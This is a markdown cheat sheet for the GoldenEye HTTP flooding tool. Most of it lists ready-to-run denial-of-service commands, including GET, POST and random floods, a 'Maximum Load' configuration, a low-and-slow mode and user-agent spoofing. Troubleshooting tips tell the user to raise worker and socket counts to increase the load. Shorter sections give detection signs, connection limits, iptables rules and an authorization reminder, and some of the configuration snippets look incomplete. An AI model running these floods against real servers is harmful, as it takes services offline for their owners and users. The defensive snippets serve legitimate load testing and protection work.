# GoldenEye Quick Reference

## Installation

```bash
sudo apt install goldeneye
# OR
git clone https://github.com/jseidl/GoldenEye.git
```

## Basic Commands

| Command | Description |
|---------|-------------|
| `./goldeneye.py <url>` | Basic GET flood |
| `./goldeneye.py <url> -m post` | POST flood |
| `./goldeneye.py <url> -w 100 -s 50` | Custom workers/sockets |
| `./goldeneye.py <url> -m random` | Random method flood |
| `./goldeneye.py <url> -d` | Debug mode |
| `./goldeneye.py <url> -n true` | Disable SSL verify |

## Options Reference

```
-w, --workers      # Worker threads (default: 50)
-s, --sockets      # Sockets per worker (default: 30)
-m, --method       # get | post | random (default: get)
-u, --useragents   # Custom user-agent file
-d, --debug        # Verbose output
-n, --nosslcheck   # Skip SSL verification
```

## Quick Scenarios

### Basic DoS Test
```bash
./goldeneye.py http://192.168.1.100
```

### Maximum Load
```bash
./goldeneye.py http://target.com -w 200 -s 100 -m random
```

### HTTPS with Custom UA
```bash
./goldeneye.py https://target.com -u useragents.txt -n true -w 100
```

### Low-and-Slow
```bash
./goldeneye.py http://target.com -w 5 -s 10
```

## Create User-Agent File

```bash
# useragents.txt
Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Mozilla/5.0 (X11; Linux x86_64)
Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)
```

## System Requirements

- Python 3.x
- Root/sudo access (raw sockets)
- Increase file limits: `ulimit -n 65535`

## Detection Indicators

- Multiple persistent connections from single IP
- Keep-Alive requests without resource loading
- High connection count with low data transfer

## Defense Quick Fixes

```bash
# Apache - limit connections
MaxClientsPerIP 10

# Nginx - rate limit
limit_conn connlimit 10;

# Firewall - block after threshold
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP
```

## Monitoring Commands

```bash
# Watch connections
watch -n 1 'netstat -an | grep :80 | wc -l'

# Monitor server logs
tail -f /var/log/apache2/access.log

# Check response time
curl -o /dev/null -s -w "%{time_total}\n" http://target.com
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Verify target is reachable |
| SSL errors | Use `-n true` flag |
| Low performance | Increase `-w` and `-s` |
| Permission denied | Run with `sudo` |

## Common Ports

| Port | Service |
|------|---------|
| 80 | HTTP |
| 443 | HTTPS |
| 8080 | Alt HTTP |
| 8443 | Alt HTTPS |

## Legal Reminder

**Authorization required before testing!** This tool is for legitimate penetration testing and security assessments only.
